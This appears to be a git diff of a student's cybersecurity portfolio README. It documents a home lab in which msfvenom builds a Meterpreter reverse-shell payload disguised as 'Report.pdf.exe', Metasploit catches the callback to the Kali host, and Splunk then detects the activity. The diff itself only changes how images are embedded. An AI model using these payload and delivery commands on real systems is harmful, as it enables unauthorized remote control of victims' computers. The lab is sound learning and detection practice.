@@ -29,8 +29,10 @@ As a student who is aspiring to break into the cybersecurity field, I have learn
         b.	Returned that port 3389 was exposed
   
         c.	“msfvenom -p windows/x64/meterpreter_reverse_tcp lhost={Kali VM IP} lport=4444 -f exe -o Report.pdf.exe” – this command specifies the payload of the attack (reverse tcp), specifies the host of the attack, the port and the file and it’s format.
+<div align="center">
+  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture1.png">
+</div>
 
-  	![kaliImage](images/Picture1.png)
 
   	    d.	“msfconsole” -> “use exploit/multi/handler” -> “set payload windows/x64/meterpreter/reverse_tcp “ – sets the payload option
   	
@@ -38,30 +40,47 @@ As a student who is aspiring to break into the cybersecurity field, I have learn
   	
         f.	“python3 -m http.server 999” – allows for the Windows machine in the same network to access the infected file 
 
-![HTTP-Server](images/Picture2.png)
 
-![Directory](images/Picture3.png)
+<div align="center">
+  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture2.png">
+</div>
+
+<br>
+<br>
+
+<div align="center">
+  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture3.png">
+</div>
 
         g.	Disable Windows Defender and open the file on the Windows VM
 
   	    h.	Looking at the Kali machine should show that you are connected to the target and should allow you to execute commands on it 
  
-![Meterpreter](images/Picture4.png)
+<div align="center">
+  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture4.png">
+</div>
 
 
 7.	Access Splunk and create an index with the name ‘endpoint’
- ![Splunk](images/Picture5.png)
-
+<div align="center">
+  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture5.png">
+</div>
 8.	Go to the search and reporting app on Splunk and type ‘index=”endpoint” {Kali IP Address}’ 
 
-![Splunk2](images/Picture6.png)
+<div align="center">
+  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture6.png">
+</div>
  
 9.	Looking at the fields, we can see that the Kali Linux machine is accessing a port, which would be something of interest to investigate.
 
-![Fields](images/Picture7.png)
+<div align="center">
+  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture7.png">
+</div>
  
 10.	Looking further into the event IDs, we can see that the issue comes from the Report.pdf.exe.
  
-![EventIDs](images/Picture8.png)
+<div align="center">
+  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture8.png">
+</div>
 
 This was a simple demonstration of how exploits can be used to target exposed ports, how malware can take control of a victim’s computer and how tools like Splunk can be used to detect unusual events which can allow for the user to take action and solve the problem
